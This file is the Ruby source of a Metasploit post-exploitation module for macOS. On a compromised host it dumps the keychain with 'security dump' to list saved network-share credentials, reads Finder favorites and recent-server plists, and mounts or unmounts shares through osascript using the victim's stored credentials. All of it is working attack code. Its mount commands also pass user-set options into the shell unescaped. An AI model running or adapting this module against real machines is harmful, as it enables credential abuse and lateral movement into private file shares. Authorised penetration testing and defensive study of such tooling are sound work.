##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  REGEX_PROTO = "^.*\=\"(.*)\w*\"\w*$"
  REGEX_SERVER = "^.*\=\"(.*)\"\w*$"

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Network Share Mounter',
        'Description'   => %q{
          This module lists saved network shares and tries to connect to them using stored credentials. This does not require root privileges.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>'
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'Actions'       => [
          [ 'LIST',     { 'Description' => 'Show a list of stored network share credentials' } ],
          [ 'MOUNT', { 'Description' => 'Mount a network shared volume using stored credentials' } ],
          [ 'UNMOUNT', { 'Description' => 'Unmount a mounted volume' } ]
        ],
        'DefaultAction' => 'LIST'
      ))

    register_options(
      [
        OptString.new('VOLUME', [true, 'Name of network share volume. `set ACTION LIST` to get a list.', 'localhost']),
        OptString.new('SECURITY_PATH', [true, 'Path to the security executable.', '/usr/bin/security']),
        OptString.new('OSASCRIPT_PATH', [true, 'Path to the osascript executable.', '/usr/bin/osascript']),
        OptString.new('SIDEBAR_PLIST_PATH', [true, 'Path to the finder sidebar plist.', '~/Library/Preferences/com.apple.sidebarlists.plist']),
        OptString.new('RECENT_PLIST_PATH', [true, 'Path to the finder recent plist.', '~/Library/Preferences/com.apple.recentitems.plist']),
        OptString.new('PROTOCOL', [true, 'Network share protocol. `set ACTION LIST` to get a list.', 'smb'])
      ], self.class)

  end

  def run
    fail_with("Invalid action") if action.nil?

    username = cmd_exec('whoami')
    security_path = datastore['SECURITY_PATH'].shellescape
    sidebar_plist_path = datastore['SIDEBAR_PLIST_PATH'].gsub(/^\~/, "/Users/#{username}").shellescape
    recent_plist_path = datastore['RECENT_PLIST_PATH'].gsub(/^\~/, "/Users/#{username}").shellescape

    if action.name == 'LIST'
      if file?(security_path)
        saved_shares = get_keyring_shares(security_path)
        if saved_shares.length == 0
          print_status("No Network Share credentials were found in the keyrings")
        else
          print_status("Network shares saved in keyrings:")
          print_status("  Protocol\tShare Name")
          saved_shares.each do |line|
            print_good("  #{line}")
          end
        end
      else
        print_error("Could not check keyring contents: Security binary not found.")
      end
      if file?(sidebar_plist_path)
        favorite_shares = get_favorite_shares(sidebar_plist_path)
        if favorite_shares.length == 0
          print_status("No favorite shares were found")
        else
          print_status("Favorite shares (without stored credentials):")
          favorite_shares.each do |line|
            print_good("  #{line}")
          end
        end
      else
        print_error("Could not check sidebar favorites contents: Sidebar plist not found")
      end
      if file?(recent_plist_path)
        recent_shares = get_recent_shares(recent_plist_path)
        if recent_shares.length == 0
          print_status("No recent shares were found")
        else
          print_status("Recent shares (without stored credentials):")
          recent_shares.each do |line|
            print_good("  #{line}")
          end
        end
      else
        print_error("Could not check recent favorites contents: Recent plist not found")
      end
      mounted_shares = get_mounted_volumes
      if mounted_shares.length == 0
        print_status("No volumes found in /Volumes")
      else
        print_status("Mounted Volumes:")
        mounted_shares.each do |line|
          print_good("  #{line}")
        end
      end
    elsif action.name == 'MOUNT'
      mount
    elsif action.name == 'UNMOUNT'
      unmount
    end
  end

  def get_keyring_shares(security_path)
    vprint_status("#{security_path} dump")
    data = cmd_exec("#{security_path} dump")
    # Grep for desc srvr and ptcl
    tmp = []
    lines = data.lines.select { |line| line =~ /desc|srvr|ptcl/ }.map(&:strip)

    # Go through the list, find the saved Network Password descriptions
    # and their corresponding ptcl and srvr attributes
    list = []
    for x in 0..lines.length-1
      if lines[x] =~ /"desc"<blob>="Network Password"/ && x < lines.length-3
        # Remove everything up to the double-quote after the equal sign,
        # and also the trailing double-quote
        if lines[x+1].match(REGEX_PROTO)
          protocol = $1
          if protocol =~ /smb|nfs|cifs|ftp|afp/ && lines[x+2].match(REGEX_SERVER)
            server = $1
            list.push(protocol + "\t" + server)
          end
        end
      end
    end
    return list.sort
  end

  def get_favorite_shares(sidebar_plist_path)
    vprint_status("defaults read #{sidebar_plist_path} favoriteservers")
    data = cmd_exec("defaults read #{sidebar_plist_path} favoriteservers")

    # Grep for URL
    list = []
    lines = data.lines
    lines.each do |line|
      line.strip!
      if line =~ /^URL = \"(.*)\"\;$/
        list.push($1)
      end
    end

    vprint_status("defaults read #{sidebar_plist_path} favorites")
    data = cmd_exec("defaults read #{sidebar_plist_path} favorites")
    # Grep for EntryType and Name
    tmp = []
    lines = data.lines
    lines.each do |line|
      line.strip!
      if line =~ /EntryType|Name/
        tmp.push(line)
      end
    end

    # Go through the list, find the rows with EntryType 8 and their
    # corresponding name
    for x in 0..tmp.length-1
      if tmp[x] =~ /EntryType = 8;/ && x < tmp.length-2
        if tmp[x+1] =~ /^Name \= \"(.*)\"\;$/
          name = $1
          list.push(name) unless list.include?(name)
        elsif tmp[x+1] =~ /^Name \= (.*)\;$/
          name = $1
          list.push(name) unless list.include?(name)
        end
      end
    end
    return list.sort
  end

  def get_recent_shares(recent_plist_path)
    vprint_status("defaults read #{recent_plist_path} RecentServers")
    data = cmd_exec("defaults read #{recent_plist_path} RecentServers")

    # Grep for Name
    regexes = [ /^Name = \"(.*)\"\;$/, /^Name = (.*)\;$/ ]
    list = data.lines.select{ |line| if regexes.any?{ |r| line.strip! =~ r } then $1 end  }.compact.uniq.map(&:strip)
    return list
  end

  def get_mounted_volumes
    vprint_status("ls /Volumes")
    data = cmd_exec("ls /Volumes")
    list = data.lines.map(&:strip).sort
    return list
  end

  def mount
    share_name = datastore['VOLUME']
    protocol = datastore['PROTOCOL']
    print_status("Connecting to #{protocol}://#{share_name}")
    cmd = "osascript -e 'tell app \"finder\" to mount volume \"#{protocol}://#{share_name}\"'"
    vprint_status(cmd)
    cmd_exec(cmd)
  end

  def unmount
    share_name = datastore['VOLUME']
    print_status("Disconnecting from #{share_name}")
    cmd = "osascript -e 'tell app \"finder\" to eject \"#{share_name}\"'"
    vprint_status(cmd)
    cmd_exec(cmd)
  end
end
